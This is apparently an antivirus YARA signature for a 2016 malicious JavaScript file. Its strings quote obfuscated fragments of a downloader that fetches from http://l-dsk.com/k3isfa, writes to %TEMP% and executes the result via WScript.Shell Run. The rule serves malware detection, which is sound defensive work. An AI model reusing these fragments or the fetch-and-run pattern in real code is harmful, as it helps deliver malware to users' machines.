rule sig_20160427_417f63bf2df687707d1e560d4e259b4a {
  meta:
    description = "datamaliciousorder - file 20160427_417f63bf2df687707d1e560d4e259b4a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "24b8d8f137b088a61d2f6c71730b3e8dc78f0c18e0bed2e884faed5a5675925b"

  strings:
    $s1  = "EbqiqZtvsl[XplivPiomz](\"G\" + \"ET\", \"http://l-dsk.com/k3isfa\", false);" fullword ascii
    $s2  = "function VtwzuWmgmp() {return EcnhyJdovv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7H3vGvL" ascii
    $s3  = "function VtwzuWmgmp() {return EcnhyJdovv[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"7H3vGvL" ascii
    $s4  = "var EcnhyJdovv = function HomieSaxuj() {return RqxzuMovws[JaivbUibos](\"WScript\"+\".Shell\");}(), AthvnHjgdz = 11;" fullword ascii
    $s5  = "function UbhazRclef(GivkdDwzyp, OfnxdVojuv){VbtzzLbxrd = VbtzzLbxrd * 1; return GivkdDwzyp - OfnxdVojuv;};" fullword ascii
    $s6  = "var RqxzuMovws = this[\"WScript\"];" fullword ascii
    $s7  = "function NuafaIiioq() {return ((BgsjtYvxcx == true) && (BgsjtYvxcx == DcmdvUzeok)) ? 1 : VbtzzLbxrd;};" fullword ascii
    $s8  = "function TwvyzLuftz(){return KetniYvcxq + \"\";};" fullword ascii
    $s9  = "if (EbqiqZtvsl[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "var DcmdvUzeok = false;" fullword ascii
    $s11 = "DcmdvUzeok = true; " fullword ascii
    $s12 = "function RqpklFtqnv(){return JaivbUibos;};" fullword ascii
    $s13 = "function NtmavBfwmz(){return 23;};" fullword ascii
    $s14 = "var IznmpKjues = false;" fullword ascii
    $s15 = "function YjkhfWqmnm(CueaoWtrcv){EcnhyJdovv[\"R\"+\"un\"](CueaoWtrcv, VbtzzLbxrd, VbtzzLbxrd);};" fullword ascii
    $s16 = "var TlcnyWpdzk = new this[\"D\"+\"ate\"]();" fullword ascii
    $s17 = "}while (FcviwUvstx);" fullword ascii
    $s18 = "function TxruhGfedr(QkedgOwaxu) {var EwpvbVkmzs = (1, 2, 3, 4, 5, QkedgOwaxu); return EwpvbVkmzs;};" fullword ascii
    $s19 = "function JrnuaBoxjv()" fullword ascii
    $s20 = "var BgsjtYvxcx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}